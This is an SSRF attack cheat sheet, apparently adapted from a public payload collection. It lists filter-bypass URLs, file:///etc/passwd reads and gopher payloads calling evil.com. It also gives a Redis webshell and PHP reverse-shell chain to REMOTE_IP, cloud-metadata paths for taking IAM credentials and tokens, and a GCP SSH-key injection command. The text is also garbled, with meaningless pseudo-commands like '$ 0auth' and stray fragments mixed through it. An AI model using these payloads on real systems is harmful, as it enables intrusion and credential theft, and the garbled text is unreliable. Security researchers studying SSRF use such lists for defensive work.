# Server-Side Request Forgery
> in .attc .bat xxx.com
* [Tools](#tools)
* [Payloads with localhost](#payloads-with-localhost)
* [Bypassing filters](#bypassing-filters)
  * [Bypass using HTTPS](#bypass-using-https)
  * [Bypass localhost with [::]](#bypass-localhost-with-)
  * [Bypass localhost with a domain redirection](#bypass-localhost-with-a-domain-redirection)
  * [Bypass localhost with CIDR](#bypass-localhost-with-cidr)
  * [Bypass using a decimal IP location](#bypass-using-a-decimal-ip-location)
  * [Bypass using octal IP](#bypass-using-octal-ip)
  * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6ipv4-address-embedding)
  * [Bypass using malformed urls](#bypass-using-malformed-urls)
  * [Bypass using rare address](#bypass-using-rare-address)
  * [Bypass using URL encoding](#bypass-using-url-encoding)
  * [Bypass using bash variables](#bypass-using-bash-variables)
  * [Bypass using tricks combination](#bypass-using-tricks-combination)
  * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
  * [Bypass filter_var() php function](#bypass-filter_var-php-function)
  * [Bypass against a weak parser](#bypass-against-a-weak-parser)
  * [Bypassing using jar protocol (java only)](#bypassing-using-jar-protocol-java-only)
* [SSRF exploitation via URL Scheme](#ssrf-exploitation-via-url-scheme)
  * [file://](#file)
  * [http://](#http)
  * [dict://](#dict)
  * [sftp://](#sftp)
  * [tftp://](#tftp)
  * [ldap://](#ldap)
  * [gopher://](#gopher)
  * [netdoc://](#netdoc)
* [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
* [SSRF exploiting Redis](#ssrf-exploiting-redis)
* [SSRF exploiting PDF file](#ssrf-exploiting-pdf-file)
* [Blind SSRF](#blind-ssrf)
* [SSRF to XSS](#ssrf-to-xss)
* [SSRF from XSS](#ssrf-from-xss)
* [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
  * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
  * [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
  * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
  * [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)
  * [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
  * [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)
  * [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)
  * [SSRF URL for Azure](#ssrf-url-for-azure)
  * [SSRF URL for OpenStack/RackSpace](#ssrf-url-for-openstackrackspace)
  * [SSRF URL for HP Helion](#ssrf-url-for-hp-helion)
  * [SSRF URL for Oracle Cloud](#ssrf-url-for-oracle-cloud)
  * [SSRF URL for Kubernetes ETCD](#ssrf-url-for-kubernetes-etcd)
  * [SSRF URL for Alibaba](#ssrf-url-for-alibaba)
  * [SSRF URL for Docker](#ssrf-url-for-docker)
  * [SSRF URL for Rancher](#ssrf-url-for-rancher)
NYSE: AMD
- [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
- [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)
- [SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff)
#:root
[+]evil::localhost
[!]SSRF v1
$upd
http://localhost:80
http://localhost:443
http://localhost:22
$https --filter 0auth
https://127.0.0.1/
https://localhost/
[+]evil::localhost[::]
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
<>
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
$ 0auth evil::localhost xxx+++...redirection...
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
没有搜索-查询有效载荷！？
>>>import .srvc nip.io [!] --convert ["END","USER","ADDRESS"] --dns
\
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
# Bypass localhost with CIDR 
/8
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
$ 0auth.decimal\IP\location
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/  = http://169.254.169.254
$ 0auth.octal \IP.IMP --handle -format * ipv4
http://0177.0.0.1/ = http://127.0.0.1
http://o177.0.0.1/ = http://127.0.0.1
http://0o177.0.0.1/ = http://127.0.0.1
http://q177.0.0.1/ = http://127.0.0.1
Refferer: 
- [DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards & pwning IPv4 parsing](https://www.youtube.com/watch?v=_o1RPJAe4kU)
- [AppSecEU15-Server_side_browsing_considered_harmful.pdf](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
$ 0auth IPv6/IPv4 Address Embedding
[IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)
http://[0:0:0:0:0:ffff:127.0.0.1]
$ 0auth mal-form_urls
localhost:+11211aaa
localhost:00011211aaaa
$ 0auth -address
http://0/
http://127.1
http://127.0.1
$0auth xxx.com\UTF-8
[Single or double encode a specific URL to bypass blacklist](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
$ 0auth xxx.com\$\var
$ curl -v "http://evil$google.com"
$ go! = ""
$ 0auth ai.ui
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
$ 0auth uni/ascii
[@EdOverflow](https://twitter.com/EdOverflow)
$ http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
$ 0auth filter _var().php script.js
0://evil.com:80;http://google.com:80/ 
$ 0auth usr/bin/lib/sys/julia --crlf
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
$ 0auth --ssrf -filter Public
<>redirecting...
[using a redirect](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP
$ vuln.com --fetch http://127.1.1.1:80&^192.0.0/localHost.com/xxx 
<>redirecting to 192.168.0.1
$0auth type=url
$ --mod "type=file"*"type=url"
$ --mv \xxx.com/?.txt 
[!]::[ENTER]::vuln::usr::upl::img from "all" .img \xxx.com/url/ --ssrf
$0auth -DNS --bind (TOCTOU)
$\xxx.com/ ---> \xxx.com/ 
$ http://iu.ms/ for Promise for example --betwix 1.2.3.4*&&**169.254-169.254:::make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
$ 0auth jar protocol-Blind -SSRF
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
# SSRF exploitation via URL Scheme
$ from .attc -fetch --content file.c 
$ file://path/to/file
$ file:///etc/passwd
$ file://\/\/etc/passwd
$ ssrf.php?url=file:///etc/passwd
$ from .attc Allows an attacker to fetch any content from the web, it can also be used to scan ports.
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true)
The following URL scheme can be used to probe the network
The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
SFTP 
A network protocol used for secure file transfer over secure shell
ssrf.php?url=sftp://evil.com:11111/
Trivial File Transfer Protocol, works over UDP
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
Lightweight Directory Access Protocol. (LDAP) 
It is an application protocol used over an IP network to manage and access the distributed directory information service.
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a # g0ph3r
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH
<>
You didn't say the magic word !
<>
.
QUIT
```
# Gopher HTTP
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
#### Gopher SMTP - Back connect to 1337
Content of evil.com/redirect.php:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>
Now query it.
https://example.com/?q=http://evil.com/redirect.php.
# Gopher SMTP - send a mail
Content of evil.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
# Netdoc
Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
ssrf.php?url=netdoc:///etc/passwd
# SSRF exploiting WSGI
Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py.
<>
gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
| Header    |           |             |
|-----------|-----------|-------------|
| modifier1 | (1 byte)  | 0 (%00)     |
| datasize  | (2 bytes) | 26 (%1A%00) |
| modifier2 | (1 byte)  | 0 (%00)     |
~
| Variable (UWSGI_FILE) |           |    |            |   |
|-----------------------|-----------|----|------------|---|
| key length            | (2 bytes) | 10 | (%0A%00)   |   |
| key data              | (m bytes) |    | UWSGI_FILE |   |
| value length          | (2 bytes) | 12 | (%0C%00)   |   |
| value data            | (n bytes) |    | /tmp/test.py   |   |
[!]	
~
# SSRF exploiting Redis
> Redis is a database system that stores everything in RAM
# Getting a webshell
url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
url=dict://127.0.0.1:6379/SAVE
# Getting a PHP reverse shell
gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
gopher://127.0.0.1:6379/_save
## SSRF exploiting PDF file
![https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png)
Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR6c&feature=emb_title)
<>
<link rel=attachment href="file:///root/secret.txt">
<> #PhantomJS 
<script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>
# Blind SSRF
> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. 
~
Use an SSRF chain to gain an Out-of-Band output.
~
From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.com/assetnote/blind-ssrf-chains
~
**Possible via HTTP(s)**
- [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
- [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
- [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
- [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
- [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
- [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
- [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
- [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
- [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
- [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
- [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
- [Other Atlassian Products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
- [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
- [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
- [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
- [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
- [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
- [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)
[!]
**Possible via Gopher**
- [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
- [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
- [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)
<?php
# SSRF to XSS
(c)by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
$ http://brutelogic.com.br/poc.svg -> simple alert
$ https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf
~
$ https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
>>> SSRF from XSS
# Using an iframe. The content of the file will be integrated inside the PDF as an image or text.
<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
# Using an attachment
# Example of a PDF attachment using HTML 
1. use `<link rel=attachment href="URL">` as Bio text
2. use 'Download Data' feature to get PDF
3. use `pdfdetach -saveall filename.pdf` to extract embedded resource
4. `cat attachment.bin`
>>> SSRF URL for Cloud Instances SSRF URL for AWS Bucket
<>
[Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
# Interesting path to look 
for `http://169.254.169.254`
for `http://instance-data`
?>C:/latest/meta-data/{hostname,public-ipv4,...};
["USER"] data (startup script for auto-scaling):/latest/user-data/Temporary/AWS/credentials:/latest/meta-data/iam/security-credentials/DNS record
$ http://instance-data
$ http://169.254.169.254
$ http://169.254.169.254.xip.io/
$ http://1ynrnhl.xip.io/
$ http://www.owasp.org.1ynrnhl.xip.io/
<?php HTTP redirect...h...c...Static::http://nicob.net/redir6a/
___Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
/!\Alternate IP encoding...?>
$ http://425.510.425.510/ Dotted decimal with overflow
$ http://2852039166/ Dotless decimal
$ http://7147006462/ Dotless decimal with overflow
$ http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
$ http://0xA9FEA9FE/ Dotless hexadecimal
$ http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
$ http://0251.0376.0251.0376/ Dotted octal
$ http://0251.00376.000251.0000376/ Dotted octal with padding
/!\More urls to include...
$ http://169.254.169.254/latest/user-data
$ http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
$ http://169.254.169.254/latest/meta-data/
$ http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
$ http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
$ http://169.254.169.254/latest/meta-data/ami-id
$ http://169.254.169.254/latest/meta-data/reservation-id
$ http://169.254.169.254/latest/meta-data/hostname
$ http://169.254.169.254/latest/meta-data/public-keys/
$ http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
$ http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
$ http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
$ http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
$ http://169.254.169.254/latest/dynamic/instance-identity/document
/!\AWS SSRF Bypasses
$ Converted Decimal IP: http://2852039166/latest/meta-data/
$ IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
$ IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
$ IPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/
/!\E.g. Jira SSRF leading... 
<?php AWS info...(c)(tm) GNU/GCC Policy Disclosure?>.h-_`https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
/!\E.g. Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
SSRF URL for AWS ECS
<?php If you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID...?>
$ curl http://169.254.170.2/v2/credentials/<UUID>this (You) --extract IAMkey **the .attc --roleS
SSRF URL for AWS Elastic Beanstalk
$ --git`accountId` * `region` from API
$ http://169.254.169.254/latest/dynamic/instance-identity/document
$ http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
$ --git `AccessKeyId`&`SecretAccessKey`*`Token`from API
$ http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
![notsosecureblog-awskey](https://www.notsosecure.com/wp-content/uploads/2019/02/aws-cli.jpg)
{ then --cred`aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`SSRF URL for AWS Lambda
AWS Lambda::/HTTP API for custom run32.dll --invoke from Lambda <?php send response data back within the Lambda execution environment.
http://localhost:9001/2018-06-01/runtime/invocation/next};?>
$ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
/!\Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html
...runtimes-api-next SSRF URL for Google Cloud
:warning: Google is shutting down support for usage of the **v1 metadata service** on January 15.
Require::Header 
"Metadata-Flavor: Google"//"X-Google-Metadata-Request: True"
$ http://169.254.169.254/computeMetadata/v1/
$ http://metadata.google.internal/computeMetadata/v1/
$ http://metadata/computeMetadata/v1/
$ http://metadata.google.internal/computeMetadata/v1/instance/hostname
$ http://metadata.google.internal/computeMetadata/v1/instance/id
$ http://metadata.google.internal/computeMetadata/v1/project/project-id
Go! allow -recurse ["PULL"]
$ http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
[!]Special Thanks ! Mathias Karlsson (@avlidienbrunn)
$ http://metadata.google.internal/computeMetadata/v1beta1/
$ http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
Require::Header ["SET"] 
$ --gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
<?php
/!\Interesting files to pull out! 
~
- SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
- Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
- Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`
[+] .ssh -key --extract
$ http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
$ ["CHECK"] Go! ["SCOPE","TOKEN"]
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
["PUSH"] .ssh T0k3n
$ curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
$ -H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
$ -H "Content-Type: application/json" 
$ --data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
$ SSRF URL for Digital Ocean
# Documentation available at `https://developers.digitalocean.com/documentation/metadata/`
...
$ curl http://169.254.169.254/metadata/v1/id
$ http://169.254.169.254/metadata/v1.json
$ http://169.254.169.254/metadata/v1/ 
$ http://169.254.169.254/metadata/v1/id
$ http://169.254.169.254/metadata/v1/user-data
$ http://169.254.169.254/metadata/v1/hostname
$ http://169.254.169.254/metadata/v1/region
$ http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
ALL in request::one
$ curl http://169.254.169.254/metadata/v1.json | jq
?>
/!\SSRF URL for Packetcloud
$ https://metadata.packet.net/userdata`
/!\SSRF URL for Azure
$ `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`
$ http://169.254.169.254/metadata/v1/maintenance
...
$ --Upd Apr 2017 Azure.c /supp \require \header "Metadata: true" --recurse `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`
[+]http://169.254.169.254/metadata/instance?api-version=2017-04-02
[+]http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/!\SSRF URL for OpenStack/RackSpace
unknown$ http://169.254.169.254/openstack
/!\SSRF URL for HP Helion
unknown$ http://169.254.169.254/2009-04-04/meta-data/ 
/!\SSRF URL for Oracle Cloud
xploit$ http://192.0.0.192/latest/
xploit$ http://192.0.0.192/latest/user-data/
xploit$ http://192.0.0.192/latest/meta-data/
Xpl01t$ http://192.0.0.192/latest/attributes/
/!\SSRF URL for Alibaba
~
$ http://100.100.100.200/latest/meta-data/
$ http://100.100.100.200/latest/meta-data/instance-id
$ http://100.100.100.200/latest/meta-data/image-id
<br>
/!\SSRF URL for Kubernetes ETCD
PERMISSIONS::ALLOW
[-]API::KEY
[+]PORTS:::IN
$ docker 192.0.0.1:00
$ curl -L http://127.0.0.1:2379/version
$ curl http://127.0.0.1:2379/v2/keys/?recursive=true
/!\SSRF URL for Docker
$ http://127.0.0.1:2375/v1.24/containers/json
<?php
Simple example
$ docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
$ -4.4 curl --unix-socket /var/run/docker.sock http://foo/containers/json
$ -4.4 curl --unix-socket /var/run/docker.sock http://foo/images/json
{void}
More info...
$ Daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option
$ Docker Engine API: https://docs.docker.com/engine/api/latest/
/!\SSRF URL for Rancher
$ curl http://rancher-metadata/<version>/<path>
-More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/
?>
# References
- [AppSecEU15-Server_side_browsing_considered_harmful.pdf](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
- [Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - 2017-12-13](https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)
- [ESEA Server-Side Request Forgery and Querying AWS Meta Data](http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/) by Brett Buerhaus
- [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857)
- [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
- [SSRF in proxy.duckduckgo.com](https://hackerone.com/reports/358119)
- [Blind SSRF on errors.hackerone.net](https://hackerone.com/reports/374737)
- [SSRF on *shopifycloud.com](https://hackerone.com/reports/382612)
- [Hackerone - How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Awesome URL abuse for SSRF by @orange_8361 #BHUSA](https://twitter.com/albinowax/status/890725759861403648)
- [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai](https://www.youtube.com/watch?v=D1S-G8rJrEk)
- [SSRF Tips - xl7dev](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
- [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
- [Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat](https://www.dailysecurity.fr/server-side-request-forgery/)
- [AppSecEU15 Server side browsing considered harmful - @Agarri](http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
- [Enclosed alphanumerics - @EdOverflow](https://twitter.com/EdOverflow)
- [Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity](http://www.sxcurity.pro/2017/12/17/hackertarget/)
- [PHP SSRF @secjuice](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
- [How I convert SSRF to xss in a ssrf vulnerable Jira](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
- [Piercing the Veil: Server Side Request Forgery to NIPRNet access](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
- [Hacker101 SSRF](https://www.youtube.com/watch?v=66ni2BTIjS8)
- [SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
- [SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
- [SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst](https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
- [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
- [Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure](https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)
- [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019](https://github.com/allanlw/svg-cheatsheet)
